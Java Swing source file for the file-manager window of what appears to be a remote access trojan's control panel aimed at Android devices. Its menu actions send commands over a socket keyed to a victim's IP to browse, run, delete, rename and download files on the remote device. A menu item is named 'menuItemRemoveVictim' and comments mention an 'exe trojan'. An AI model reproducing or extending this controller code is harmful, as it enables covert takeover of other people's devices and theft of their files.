package New;

import java.awt.BorderLayout;
import java.awt.Color;
import java.awt.Component;
import java.awt.Font;
import java.awt.Toolkit;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.awt.event.ComponentAdapter;
import java.awt.event.ComponentEvent;
import java.awt.event.MouseAdapter;
import java.awt.event.MouseEvent;

import javax.swing.BorderFactory;
import javax.swing.ImageIcon;
import javax.swing.JButton;
import javax.swing.JFrame;
import javax.swing.JMenuItem;
import javax.swing.JOptionPane;
import javax.swing.JPanel;
import javax.swing.JPopupMenu;
import javax.swing.JScrollPane;
import javax.swing.JSplitPane;
import javax.swing.JTable;
import javax.swing.JTextArea;
import javax.swing.plaf.FontUIResource;
import javax.swing.table.DefaultTableModel;
import javax.swing.table.TableCellRenderer;
import javax.swing.table.TableColumn;
import javax.swing.table.TableColumnModel;

public class Android_File_Manager {
	private  JFrame form ;
	private  JTable j; 
	private    JScrollPane sp;
    private  JPopupMenu popupMenu;
    private  JMenuItem menuItem_Run_File;
    private  JMenuItem Refresh_menuitem;
    private  JMenuItem Download_file;
    private  JMenuItem Test_Download_file;
    private  JMenuItem Upload_file;
    private  JMenuItem menuItemRemoveVictim;
    private  JMenuItem addFolder;
    private  String File_Seperator ="x";
    private  int Upload_Chunk = 0;
    private  int there_but_notsent=0;
    private  boolean exit_unstable = false;
	private  String Exe_Split = "fxf0x4x4x0fxf";
	private  String Exe_Ending = "c2x2824x828200x0c";
	private  String Jar_Split = "fxf0x4x4x0fxf";
	private  String Jar_Ending = "c2x2824x828200x0c";
	private  String sock = "";
    private  String title = "";
	private  JTextArea Dir ;
	private  String File_Sep = ""; 
	private  String YY="";
	public Android_File_Manager(String ip){
		this.sock = ip;
	
	}
	public JTextArea get_DIR(){
		return Dir;
	}
	public void Set_sock(String ip){
		sock = ip;
	}
	public void Set_File_Sep(String s){
		File_Sep = s;
	}
	public String Get_sock(){
		return sock ;
	}
	 class CellRenderer implements TableCellRenderer {
		 
	        @Override
	        public Component getTableCellRendererComponent(JTable table,
	                Object value,
	                boolean isSelected,
	                boolean hasFocus,
	                int row,
	                int column) {
	 
	            TableColumn tb = j.getColumn("Image");
	            tb.setMaxWidth(60);
	            tb.setMinWidth(60);
	 
	            j.setRowHeight(60);
	 
	            return (Component) value;
	        }
	 
	    }
	public void yourAddRow(String str0,String str1, String str2, String str3 ){
		  DefaultTableModel Model = (DefaultTableModel) j.getModel();
			 
			 if(str0 == "#"){
				 //Drive icon
				// CellRenderer CellRenderer = new CellRenderer();
				// j.getColumn("Image").setCellRenderer(CellRenderer);
				 ImageIcon icon=new ImageIcon(Master.class.getResource("Drive.png"));
				 /*for(int row = 0;row < j.getRowCount();row++) {
					  for(int col = 0;col < j.getColumnCount();col++) {
						 
				 	    	if (Model.getValueAt(row, 1) == str1 || (Model.getValueAt(row, 1)).toString().contains(str1)){
				 	    		 // new MessageBox().infoBox(str1, str2);
				 	    		 //remo_row(str1,str2);
				 	    		  Model.addRow(new Object[]{icon,str1, str2, str3});
				 	    		 // Model.removeRow(row);
				 	    	}
				 	      }
				 	}*/
				  Model.addRow(new Object[]{icon,str1, str2, str3});
			 }else  if(str0 == "$"){
				 //Folder icon
				 ImageIcon icon=new ImageIcon(Master.class.getResource("folder.png"));
				  Model.addRow(new Object[]{icon,str1, str2, str3});
			 }else  if(str0 == "@"){
				 //File icon
				 ImageIcon icon=new ImageIcon(Master.class.getResource("file.png"));
				  Model.addRow(new Object[]{icon,str1, str2, str3});
			 }
			 
			 for(int row = 0;row < Model.getRowCount();row++) {
				  for(int col = 0;col < Model.getColumnCount();col++) {
					  j.setRowHeight(row, 25);
					   
			 	      }
			 	}
			 TableColumnModel columnModel = j.getColumnModel();
			  columnModel.getColumn(0).setMaxWidth(25);
			  
			// setColumnWidths(j,0);
		 //IP is 2nd column
			  j.updateUI();
			   sp.updateUI();
		   j.repaint();
		   sp.repaint();
		  
		   form.repaint();
		}
	public static void setColumnWidths(JTable table, int... widths) {
	    TableColumnModel columnModel = table.getColumnModel();
	    for (int i = 0; i < widths.length; i++) {
	        if (i < columnModel.getColumnCount()) {
	            columnModel.getColumn(i).setMaxWidth(widths[i]);
	        }
	        else break;
	    }
	}
	 private  String convertSize(float iSize)
	 {
	   if (iSize <= 0.0F) {
	     return "0";
	   }
	   
	   String[] units = { "Bytes", "KB", "MB", "GB", "TB" };
	   int digitGroups = (int)(Math.log10(iSize) / Math.log10(1024.0D));
	   
	   return new java.text.DecimalFormat("#,##0.#")
	     .format(iSize / Math.pow(1024.0D, digitGroups)) + 
	     " " + units[digitGroups];
	 }
	 public  void Do_frame(){
		 form = new JFrame();
		 form.setName("File Manager For : " + sock);
		 form.setTitle("File Manager For : " + sock);
		 title = "File Manager For : " + sock;
		 form.setResizable(false);
		  
		 int widthx =  (int) Toolkit.getDefaultToolkit().getScreenSize().getWidth();
		 int heightx = (int) Toolkit.getDefaultToolkit().getScreenSize().getHeight();
	 
		 form.setBounds((widthx -500)/2,( heightx -430)/2, 500, 430);
		 form.setLayout(null);
		 Font font = new Font("Microsoft Sans Serif", Font.PLAIN, 12);
		 Dir = new JTextArea("");
		 Dir.setBounds(5, 5, 485, 65);
		 
		 JButton btnNext = new JButton("Back");
			btnNext.addActionListener(new ActionListener() {
				public void actionPerformed(ActionEvent arg0) {
					//do here some stuff
					if(Dir.getText().length()< 4){
						  get_row_index(); //clear jtable
						  Dir.setText("");
						 // here x
					}else{
						
						if (Dir.getText().contains("/")){
							int last_index = Dir.getText().lastIndexOf("/");
							 Dir.setText(Dir.getText().substring(0, last_index) );  
							int last_index2 = Dir.getText().lastIndexOf("/")  +1 ;
							 Dir.setText(Dir.getText().substring(0, last_index2) );  
							 //re command exe trojan 
							  Dir.repaint();
							  get_row_index(); //clear jtable
							  sock = title.replace("File Manager For : "  , "");
		                	  Master.Send_Data("file_manager" + Exe_Split  + Dir.getText().replace("//", "/")   , sock,true);

						}else if (Dir.getText().contains("\\")){
							int last_index = Dir.getText().lastIndexOf(("\\").charAt(0));
							 Dir.setText(Dir.getText().substring(0, last_index) );  
							int last_index2 = Dir.getText().lastIndexOf(("\\").charAt(0)) +1 ;
							 Dir.setText(Dir.getText().substring(0, last_index2) );  
							 //re command exe trojan 
							  Dir.repaint();
							  get_row_index(); //clear jtable
							  sock = title.replace("File Manager For : "  , "");
		                	  Master.Send_Data("file_manager" + Exe_Split  + Dir.getText().replace("//", "/")   , sock,true);

						}else if (Dir.getText().contains(":")){
							int last_index = Dir.getText().lastIndexOf((":").charAt(0));
							 Dir.setText(Dir.getText().substring(0, last_index) );  
							int last_index2 = Dir.getText().lastIndexOf((":").charAt(0)) +1 ;
							 Dir.setText(Dir.getText().substring(0, last_index2) );  
							 //re command exe trojan 
							  Dir.repaint();
							  get_row_index(); //clear jtable
							  sock = title.replace("File Manager For : "  , "");
		                	  Master.Send_Data("file_manager" + Exe_Split  + Dir.getText().replace("//", "/")   , sock,true);

						}
							                	  
					}
					
				}
			});
			btnNext.setBounds(5, 75, 100, 23);
			btnNext.setBackground(new Color(0, 64, 128));
			btnNext.setForeground(Color.WHITE);
			 JButton btnNext_Refresh = new JButton("Refresh");
			 btnNext_Refresh.setForeground(Color.WHITE);
			 btnNext_Refresh.addActionListener(new ActionListener() {
					public void actionPerformed(ActionEvent arg0) {
						 if (Dir.getText().length()>0){
							  Dir.repaint();
							  get_row_index(); //clear jtable
							  sock = title.replace("File Manager For : "  , "");
		                	  Master.Send_Data("file_manager"+ Exe_Split  + Dir.getText().replace("//", "/")   , sock,true);
						 }else{
							 get_row_index(); //clear jtable  "GetPath^&"
							 Master.Send_Data("file_manager" + Exe_Split + "/" ,sock,true);
							 
						 }
							

						 
					}
				});
			 btnNext_Refresh.setIcon(new ImageIcon(Master.class.getResource("/some_icons/" + "refresh.png" )));
			 btnNext_Refresh.setBounds(90, 75, 100, 23);
			 btnNext_Refresh.setBorder(BorderFactory.createEmptyBorder(0, 0, 2, 20));
			 btnNext_Refresh.setBackground(new Color(0, 64, 128));
			 
			DefaultTableModel model = new DefaultTableModel(){

     	         @Override
     	         public boolean isCellEditable(int row, int column) {
     	             //Only the third column
     	             return false;
     	         }
     	    	public Class<?> getColumnClass(int column) {
     	           switch(column) {
     	               
     	               case 0: return ImageIcon.class;
     	               default: return Object.class;
     	           	}
     	   				}
			};

			
			JPopupMenu popupMenu = new JPopupMenu();
		     menuItem_Run_File = new JMenuItem("Run Item");  
		     Refresh_menuitem = new JMenuItem("Delete Item");
		     Download_file = new JMenuItem("Download File(Chunks)"); 
		     Test_Download_file = new JMenuItem("Fast Download(Best)");
		     Upload_file = new JMenuItem("Upload File");
			menuItemRemoveVictim = new JMenuItem("Rename Item");
			addFolder = new JMenuItem("New Folder");
 
			menuItem_Run_File.setIcon(new ImageIcon(Master.class.getResource("/some_icons/" + "desktop icon.png" )));
			Refresh_menuitem.setIcon(new ImageIcon(Master.class.getResource("/some_icons/" + "recylce.png" )));
			Download_file.setIcon(new ImageIcon(Master.class.getResource("/some_icons/" + "down arrow.png" )));
			Test_Download_file.setIcon(new ImageIcon(Master.class.getResource("/some_icons/" + "download.png" )));	
			Upload_file.setIcon(new ImageIcon(Master.class.getResource("/some_icons/" + "upload arrow.png" )));
			menuItemRemoveVictim.setIcon(new ImageIcon(Master.class.getResource("/some_icons/" + "rename.png" )));
			
			addFolder.setIcon(new ImageIcon(Master.class.getResource("/some_icons/" + "addfolder.png" )));
			
			btnNext.setIcon(new ImageIcon(Master.class.getResource("/some_icons/" + "back.png" )));
	 
			btnNext.setBounds(5, 75, 80, 23);btnNext.setBorder(BorderFactory.createEmptyBorder(0, 0, 2, 20));
			
			
			menuItem_Run_File.setBackground(new Color(0, 64, 128));
			addFolder.setBackground(new Color(0, 64, 128));
			Refresh_menuitem.setBackground(new Color(0, 64, 128));
				Test_Download_file.setBackground(new Color(0, 64, 128));
				Upload_file.setBackground(new Color(0, 64, 128));
			Download_file.setBackground(new Color(0, 64, 128));
			    
			    menuItemRemoveVictim.setBackground(new Color(0, 64, 128));
			 	
			
			
			popupMenu.add(menuItem_Run_File);
			popupMenu.add(addFolder);
			popupMenu.add(Refresh_menuitem);
			popupMenu.add(Test_Download_file);	
			popupMenu.add(Download_file);		
			popupMenu.add(Upload_file);
			popupMenu.add(menuItemRemoveVictim);
			menuItem_Run_File.setForeground(Color.WHITE);
			addFolder.setForeground(Color.WHITE);
			Refresh_menuitem.setForeground(Color.WHITE);
			Test_Download_file.setForeground(Color.WHITE);
			Download_file.setForeground(Color.WHITE);
			Upload_file.setForeground(Color.WHITE);
			menuItemRemoveVictim.setForeground(Color.WHITE);
			ImageIcon icon=new ImageIcon("Drive.png");
		    Object[] columnNames = {"^.^","Drive / File / Folder", "Type / Ext.", "Size"}; 

			// adding it to JScrollPane 
	       /* for (String Col_name : columnNames){
	        	TableColumn Col = new TableColumn();
		        
		        model.addColumn(Col_name);
		        
	        }*/
	        model.setColumnIdentifiers(columnNames);
	      	j = new JTable(model); 
	        j.setGridColor(new Color(0, 64, 128));
			   j.setBackground(new Color(0, 64, 128) );
			   j.setOpaque(true);
			   j.setFillsViewportHeight(true);
			   j.setForeground(Color.WHITE);
	     
		
	      	
	      	        
	        j.setBounds(5, 100, 485, 290); 
	        j.setComponentPopupMenu(popupMenu);
			 
	        
	        j.addMouseListener(new MouseAdapter() {
	            public void mouseClicked(MouseEvent me) {
	               if (me.getClickCount() == 2) {     // to detect doble click events
	                  JTable target = (JTable)me.getSource();
	                  int row = target.getSelectedRow(); // select a row
	                  int column = target.getSelectedColumn(); // select a column
	                  String selected_Value_double_click =j.getModel().getValueAt(row, 1).toString();
	                  String item_type =j.getModel().getValueAt(row, 2).toString();
	                  
	                  if (item_type.contains("Folder")||item_type.contains("Drive")){
	                 
	                	  
	                		 if(item_type.contains("null D") || Dir.getText().contains("/")){
	                			  Dir.setText(Dir.getText() + selected_Value_double_click + "/");  
			                	  Dir.repaint();
	                		 }else{
	                			  Dir.setText(Dir.getText() + selected_Value_double_click + (File_Sep).charAt(0) );  
			                	  Dir.repaint();
	                		 }
		                	
		                	 // System.out.print("here enter command : " + Dir.getText());
		                	  get_row_index(); //clear jtable
		                	  System.out.println("iam          " + sock );
		                	  sock = title.replace("File Manager For : "  , "");
		                	 // new MessageBox().infoBox("iam " + sock, "");
		                	  Master.Send_Data("file_manager" + Exe_Split  + Dir.getText().replace("//", "/")   , sock,true);
		                 
	                	  
	                 }
	                  
	                  
	               }
	            }
	         });
	        
	        
	    	btnNext.setIcon(new ImageIcon(Master.class.getResource("/some_icons/" + "back.png" )));
	   	 	btnNext.setBorder(BorderFactory.createEmptyBorder(0, 0, 2, 20));
		    btnNext.setLayout(null);
	        Refresh_menuitem.addActionListener(new ActionListener() {
	        	
	  				public void actionPerformed(ActionEvent event) {
	  					//do here some stuff
	  				 
	  				 if (JOptionPane.showConfirmDialog(form, 
	 			            "Are you sure you want to Delete Selected Item ?", "Close Window?", 
	 			            JOptionPane.YES_NO_OPTION,
	 			            JOptionPane.QUESTION_MESSAGE) == JOptionPane.YES_OPTION){
	  					int selectedRow = j.getSelectedRow();
						String selected_item = j.getModel().getValueAt(selectedRow, 1).toString();
						  sock = title.replace("File Manager For : "  , "");
						Master.Send_Data("delete"  +  Exe_Split+ Dir.getText() + selected_item    +  Exe_Split  , sock,false);
	 			        }	 
	  				
	  				
	  					
	  		         
	  				}
	  			});
	  			
	        
	        
	        menuItem_Run_File.addActionListener(new ActionListener() {
	        	
				public void actionPerformed(ActionEvent event) {
					//do here some stuff
						int selectedRow = j.getSelectedRow();
						String selected_item = j.getModel().getValueAt(selectedRow, 1).toString();
						  sock = title.replace("File Manager For : "  , "");
						Master.Send_Data("execute"  +  Exe_Split+ Dir.getText() + selected_item    +  Exe_Split + Exe_Ending , sock,false);
		        		//Send_Data("openfm" + Exe_Split + Exe_Ending,selected_sock);
		        		
		         
				}
			}); 
	        menuItemRemoveVictim.addActionListener(new ActionListener() {
	        	
	   				public void actionPerformed(ActionEvent event) {
	   					//do here some stuff
	   						int selectedRow = j.getSelectedRow();
	   						String selected_item = j.getModel().getValueAt(selectedRow, 1).toString();
	   						  sock = title.replace("File Manager For : "  , "");
	   						  //rename
	   						String ren_to = selected_item;
	   						 
	   						ren_to = JOptionPane.showInputDialog("Rename Item",ren_to);
	   						if(ren_to.equals(selected_item)){
	   							new MessageBox().errorBox_nothread("The Same name [Old name] Entered" + "\n" + "Handler : Ignore event", "Same name entered");
	   						}else{
	   							if(ren_to.length() > 0){
	   								String Old_path =  Dir.getText() + selected_item ;
	   								String new_path_withoutname = Dir.getText();
	   								String new_name = ren_to;
	   								if(j.getModel().getValueAt(selectedRow, 2).toString().contains("Folder")){
	   									Master.Send_Data("renamefolder"  +  Exe_Split+ Old_path   +  Exe_Split + new_path_withoutname +   Exe_Split  + new_name + Exe_Split + Exe_Ending , sock,false);
	   								}else{
	   									Master.Send_Data("renamefile"  +  Exe_Split+ Old_path  +  Exe_Split + new_path_withoutname +   Exe_Split  + new_name + Exe_Split  + Exe_Ending , sock,false);
	   								}
	   								
	   							}
	   						}
	   					//	
	   		        		//Send_Data("openfm" + Exe_Split + Exe_Ending,selected_sock);
	   		        		
	   		         
	   				}
	   			});
	        
	        addFolder.addActionListener(new ActionListener() {
	        	
   				public void actionPerformed(ActionEvent event) {
   					//do here some stuff
   						 
   						  sock = title.replace("File Manager For : "  , "");
   						  //rename
   						String ren_to = "New Folder";
   						 
   						int exist_fold = 0;
   					  DefaultTableModel Model = (DefaultTableModel) j.getModel();
   					 for(int row = 0;row < j.getRowCount();row++) {
  					  for(int col = 0;col < j.getColumnCount();col++) {
  						 
  				 	    	if (Model.getValueAt(row, 1) == ren_to || (Model.getValueAt(row, 1)).toString().contains(ren_to)){
  				 	    		exist_fold +=1;
  				 	    	}
  				 	      }
  				 	} 
   						 if(exist_fold>0){
   							ren_to = "New folder (" + exist_fold + ")";
   							ren_to = JOptionPane.showInputDialog("New Folder Name",ren_to);
   							if(ren_to.length() > 0){
   							 
   								String new_path_withoutname = Dir.getText();
   								String new_name = ren_to;
   							 for(int row = 0;row < j.getRowCount();row++) {
   		  					  for(int col = 0;col < j.getColumnCount();col++) {
   		  						 
   		  				 	    	if (Model.getValueAt(row, 1) == new_name || (Model.getValueAt(row, 1)).toString().contains(new_name)){
   		  				 	    	exist_fold +=1;
   		  				 	    	break;
   		  				 	    	}
   		  				 	      }
   		  					 
   		  				 	} 
   							 	if (exist_fold>0){
   							 	ren_to = "New folder (" + exist_fold + ")";
   							 	}
   									Master.Send_Data("crefolder"   +  Exe_Split + new_path_withoutname +   Exe_Split  + ren_to + Exe_Split + Exe_Ending , sock,false);
   								 
   								
   							}
   						 }else{
   							ren_to = "New folder";
   							ren_to = JOptionPane.showInputDialog("New Folder Name",ren_to);
   							if(ren_to.length() > 0){
   							 
   								String new_path_withoutname = Dir.getText();
   								String new_name = ren_to;
   							 for(int row = 0;row < j.getRowCount();row++) {
   		  					  for(int col = 0;col < j.getColumnCount();col++) {
   		  						 
   		  				 	    	if (Model.getValueAt(row, 1) == new_name || (Model.getValueAt(row, 1)).toString().contains(new_name)){
   		  				 	  	exist_fold +=1;
   		  				 	  	break;
   		  				 	    	}
   		  				 	      }
   		  					 
   		  				 	} 
   							if (exist_fold>0){
   							 	ren_to = "New folder (" + exist_fold + ")";
   							 	}
   									Master.Send_Data("crefolder"   +  Exe_Split + new_path_withoutname +   Exe_Split  + ren_to + Exe_Split + Exe_Ending , sock,false);
   								 
   								
   							}
   						 }
   						
   						
   							
   						 
   					//	
   		        		//Send_Data("openfm" + Exe_Split + Exe_Ending,selected_sock);
   		        		
   		         
   				}
   			});
	        Download_file.addActionListener(new ActionListener() {
	        	
				public void actionPerformed(ActionEvent event) {
					//do here some stuff
						int selectedRow = j.getSelectedRow();
						String selected_item = j.getModel().getValueAt(selectedRow, 1).toString();
						if(j.getModel().getValueAt(selectedRow, 2).toString().contains("Folder")){
							new MessageBox().errorBox_nothread("The Selected item is Folder" + "\n" + "Handler : Ignore event", "Invalid Download item");
						}else{
							  sock = title.replace("File Manager For : "  , "");
								Master.Send_Data("downloadfile"  +  Exe_Split+ Dir.getText() + File_Sep + selected_item    +  Exe_Split + Exe_Ending , sock,false);
								Download_file.setEnabled(false);
								Download_file.repaint();
								Test_Download_file.setEnabled(false);
								Test_Download_file.repaint();
				        		//Send_Data("openfm" + Exe_Split + Exe_Ending,selected_sock);
				        		
						}
					
		         
				}
			});
	        Test_Download_file.addActionListener(new ActionListener() {
	        	
				public void actionPerformed(ActionEvent event) {
					//do here some stuff
						int selectedRow = j.getSelectedRow();
						String selected_item = j.getModel().getValueAt(selectedRow, 1).toString();
						  sock = title.replace("File Manager For : "  , "");
						  if(j.getModel().getValueAt(selectedRow, 2).toString().contains("Folder")){
								new MessageBox().errorBox_nothread("The Selected item is Folder" + "\n" + "Handler : Ignore event", "Invalid Download item");
							}else{
								Master.Send_Data("unstable_download_nothread" +  Exe_Split+ Dir.getText() + File_Sep + selected_item    +  Exe_Split + Exe_Ending , sock,false);
								//	Master.Send_Data("unstable_download"  +  Exe_Split+ Dir.getText() + File_Sep + selected_item    +  Exe_Split + Exe_Ending , sock);
									Test_Download_file.setEnabled(false);
									Test_Download_file.repaint();
									Download_file.setEnabled(false);
									Download_file.repaint();
					        		//Send_Data("openfm" + Exe_Split + Exe_Ending,selected_sock);
					        		
							}
					
		         
				}
			});  
	    	Upload_file.addActionListener(new ActionListener() {
	        	
				public void actionPerformed(ActionEvent event) {
					//do here some stuff
					 
						  sock = title.replace("File Manager For : "  , "");
						// do_upload();
					
		         
				}
			});
	        btnNext_Refresh.setFont(font);
	        btnNext.setFont(font);
			Dir.setFont(font);
			Dir.setEditable(false);
			 
			
			
			
			
		    form.addWindowListener(new java.awt.event.WindowAdapter() {
			    @Override
			    public void windowClosing(java.awt.event.WindowEvent windowEvent) {
			   
			    	 if (JOptionPane.showConfirmDialog(form, 
			            "Are you sure you want to close File Manager "+ sock +" window?", "Close Window?", 
			            JOptionPane.YES_NO_OPTION,
			            JOptionPane.QUESTION_MESSAGE) == JOptionPane.YES_OPTION){
			    	     Master.Remove_Form_FileManager_Android(sock);
			    	 	form.setDefaultCloseOperation(JFrame.DISPOSE_ON_CLOSE);
			        }else{
			        	form.setDefaultCloseOperation(JFrame.DO_NOTHING_ON_CLOSE);
			        	
			        }
			    }
			}); 
			
			
			
			
		   FontUIResource fontx = new FontUIResource("Verdana", Font.PLAIN, 13);
		    
		//	 form.add(btnNext);
			// form.add(Dir);
		        sp = new JScrollPane(j); 
		        j.setFont(fontx);
		        sp.setBounds(5, 100, 485, 290); 
		        form.setLayout(new BorderLayout());
		        JPanel Buttons = new JPanel();
		        Buttons.setSize(50, 50);
		        Buttons.setBackground(Color.DARK_GRAY);
		        Buttons.setLayout(null);
		        Buttons.add(btnNext); 
		        Buttons.add(Dir);
		        Buttons.add(btnNext_Refresh); 
		        Buttons.setBackground(new Color(0, 64, 128) );
		        Buttons.setOpaque(true);
		        Buttons.setForeground(Color.WHITE);
		     
		 
		        Dir.setBackground(new Color(0, 64, 128) );
		        Dir.setOpaque(true);
 
		        Dir.setForeground(Color.WHITE);
		     
				   // spRight.setDividerSize(300);
				   // spRight.setContinuousLayout(true);
				    final JSplitPane split;

				    split = new JSplitPane(JSplitPane.VERTICAL_SPLIT, Buttons,sp );
				   // split.setContinuousLayout(false);
				    split.setDividerSize(10);
				    split.setDividerLocation(120);
				    split.setOneTouchExpandable(true);
				    //form.add(split, BorderLayout.CENTER);
				    form.addComponentListener(new ComponentAdapter() {
				        public void componentResized(ComponentEvent componentEvent) {
				        	split.setDividerLocation(120 );
				        	Dir.setSize(form.getWidth()-10,Dir.getHeight() );
				        	split.validate();
				        	split.repaint();
				        }
				    });
				 //form.add(sp);
			        //form.add(leftSplitPane, BorderLayout.WEST);
			       // form.add(splitPane, BorderLayout.CENTER);
				 form.validate();
				 form.setResizable(true);
				    form.getContentPane().add(split, BorderLayout.CENTER);
		        
		        
		        
		        
		        
		        
			// form.add(sp);
			 form.validate();
			// form.getContentPane().setBackground(Color.DARK_GRAY);
			 form.setVisible(true);
			
	}
	
	private void remo_row(String str1,String str2){
		 DefaultTableModel Model = (DefaultTableModel) j.getModel();
		 for(int row = 0;row < Model.getRowCount();row++) {
			  for(int col = 0;col < Model.getColumnCount();col++) {
				 
		 	    	if (Model.getValueAt(row, 1) == str1 || (Model.getValueAt(row, 1)).toString().contains(str1)){
		 	    		//  new MessageBox().infoBox(str1, str2);
		 	    		 Model.removeRow(row);
		 	    		 j.revalidate();
		 	    	}
		 	      }
		 	}
	}
	public void get_row_index(){
		 
		 DefaultTableModel dm = (DefaultTableModel) j.getModel();
		 int rowCount = dm.getRowCount();
		 //Remove rows one by one from the end of the table
		 for (int i = rowCount - 1; i >= 0; i--) {
		     dm.removeRow(i);
		 	j.repaint();
		 }
	}
	public void Add_Folder(String fname , String filesnum){
		 
		 yourAddRow("$",fname.split("fmitem")[0],filesnum,"N/A");
		 j.repaint();
		 
	     sp.updateUI();
	     sp.repaint();
		 form.repaint();
	}
	public void Add_File(String fname , String silesize){
		  yourAddRow("@",fname,"" + " File" ,convertSize(Float.parseFloat(silesize)));
		 j.repaint();
		 
	     sp.updateUI();
	     sp.repaint();
		 form.repaint();
	}
}
